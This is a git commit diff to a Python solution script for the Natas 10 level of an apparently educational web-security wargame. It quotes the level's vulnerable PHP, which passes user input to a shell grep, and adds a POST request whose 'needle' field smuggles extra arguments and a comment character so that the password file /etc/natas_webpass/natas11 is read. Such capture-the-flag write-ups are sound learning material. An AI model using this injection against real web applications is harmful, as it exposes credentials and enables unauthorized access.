a9ec173afa41b9d643d7364fec9d693bc7776386
Adrian Kristanto <49110670+adriankristanto@users.noreply.github.com>
2020-08-02 13:36:35 +1000

    send the code injection

--- natas10/natas10.py
+++ natas10/natas10.py
@@ -22,3 +22,29 @@ response = session.get(URL + 'index-source.html')
 source = html.unescape(response.text).replace('<br />', '')
 div = bs4.BeautifulSoup(source, 'lxml').body.div
 print(f'{div}\n')
+
+
+"""
+$key = "";
+if(array_key_exists("needle", $_REQUEST)) {    
+    $key = $_REQUEST["needle"];
+}
+if($key != "") {    
+    if(preg_match('/[;|&amp;]/',$key)) {        
+        print "Input contains an illegal character!";    
+    } else {        
+        passthru("grep -i $key dictionary.txt");    
+    }
+}
+"""
+# if our command contains one of the following: ; | &
+# it will print "Input contains an illegal character"
+# we can still apply our previous solution for this challenge
+# at the end, we can add #, which will comment out dictionary.txt as # was not escaped
+data = {
+    'needle' : '.* /etc/natas_webpass/natas11 # ',
+    'submit' : 'submit'
+}
+response = session.post(URL, data=data)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.div
+print(f'{div_content}')
